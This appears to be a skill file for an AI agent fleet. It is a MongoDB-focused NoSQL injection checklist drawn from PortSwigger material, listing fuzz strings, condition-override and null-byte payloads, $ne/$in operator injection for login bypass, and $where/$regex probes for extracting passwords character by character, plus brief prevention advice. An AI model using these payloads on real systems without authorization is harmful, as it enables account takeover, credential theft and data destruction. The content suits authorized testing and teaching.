---
name: offensive-nosqli
description: "NoSQL injection checklist (MongoDB focus): syntax injection (fuzz strings, character-by-character processing tests, conditional behavior confirmation, condition overriding, null-byte truncation) and operator injection ($ne, $in, $regex, $where via JSON nested objects or URL param[$ne] syntax), authentication bypass, and data extraction via boolean/regex char-by-char exfiltration. Use when a backend stores data outside SQL (Mongo, Couch, Firebase-style APIs)."
---

# SKILL: NoSQL Injection

## Metadata
- **Skill Name**: nosqli
- **Folder**: offensive-nosqli
- **Source**: PortSwigger Web Security Academy — NoSQL injection (https://portswigger.net/web-security/nosql-injection)

## Description
NoSQL injection checklist (MongoDB focus): syntax injection (fuzz strings, character-by-character processing tests, conditional behavior confirmation, condition overriding, null-byte truncation) and operator injection ($ne, $in, $regex, $where via JSON nested objects or URL param[$ne] syntax), authentication bypass, and data extraction via boolean/regex char-by-char exfiltration. Use when a backend stores data outside SQL (Mongo, Couch, Firebase-style APIs).

## Trigger Phrases
Use this skill when the conversation involves any of:
`nosql injection, mongodb injection, operator injection, $ne, $where, $regex, syntax injection, mongo auth bypass, nosql exfiltration, url param operator`

## Description (Full)
NoSQL injection interferes with the queries an application makes to a NoSQL database — enabling authentication bypass, data extraction/editing, DoS, and sometimes code execution. Two families: syntax injection (break the query language) and operator injection (abuse query operators).

## Full Methodology

# NoSQL Injection

## Shortcut

- Fuzz every input with the Mongo canary: `'"\`{\n;$Foo}\n$Foo \xYZ\0` — changed behavior = unsanitized input.
- Confirm conditional behavior with `' && 0 && 'x` vs `' && 1 && 'x`.
- Override conditions (`'||'1'=='1`) or null-terminate (`'%00`) to drop restrictions.
- Try operator injection in JSON (`{"username":{"$ne":"invalid"}}`) and URL form (`username[$ne]=invalid`) — auth bypass is the usual prize.
- Extract data with `$where`/`$regex` char-by-char boolean probes.

## Syntax injection (MongoDB)

App builds: `this.category == 'fizzy'` from user input.

1. **Detect** with the fuzz string `'"\`{\r;$Foo}\n$Foo \xYZ\0` (URL-encode when injecting via GET; use `\\r\\n\\u0000` variants for JSON contexts).
2. **Which characters process?** Submit single characters: `'` → error/change = syntax interpreted; escape it (`\'`) to confirm.
3. **Confirm conditional behavior**: `' && 0 && 'x` (false) vs `' && 1 && 'x` (true) — differential response means you control query logic.
4. **Override conditions**: `'||'1'=='1` returns everything (hidden/unreleased/other users' data). Warning: the same request data often feeds UPDATE/DELETE queries too — always-true injections can destroy data.
5. **Null-byte truncation**: `fizzy'%00` — MongoDB ignores everything after the null, dropping trailing conditions like `this.released == 1`.

## Operator injection

Mongo operators: `$where`, `$ne`, `$in`, `$regex`, `$gt`, `$exists`.

- **JSON bodies**: nest operators — `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}` logs in as the first user.
- **URL parameters**: `username[$ne]=invalid&password[$ne]=invalid`. If that fails: switch GET→POST, set `Content-Type: application/json`, send the body as JSON, then inject operators there.
- **Targeted**: `{"username":{"$in":["admin","administrator"]},"password":{"$ne":""}}`.

## Data extraction

- **$where JavaScript**: `admin' && this.password[0] == 'a' || 'a'=='b` — char-by-char extraction; `this.password.match(/\d/)` for class probes.
- **Identify fields first**: `admin' && this.password!='` vs a nonsense field (`this.foo!='`) — differential response confirms field existence; dictionary-attack names otherwise.
- **$regex operator**: `{"username":{"$regex":"^a"},"password":{"$ne":""}}` — regex-based boolean extraction without JavaScript execution.

## Prevention

- Sanitize/validate input with a strict allow-list (types, ranges, formats).
- Prefer parameterized queries and ORM/driver features that don't string-concatenate filters.
- Block operator keys in user JSON (reject keys starting with `$`); validate against expected field sets.

## Notes for the fleet

- Operator injection = "user input becomes a query *object*, not a value" — the same bug shape as on-chain calldata where a parameter is decoded as a struct the caller controls.
- DeFi indexing services and off-chain APIs (Firebase/Mongo-backed dashboards, wallet trackers) are the usual NoSQL surface in a protocol's scope.
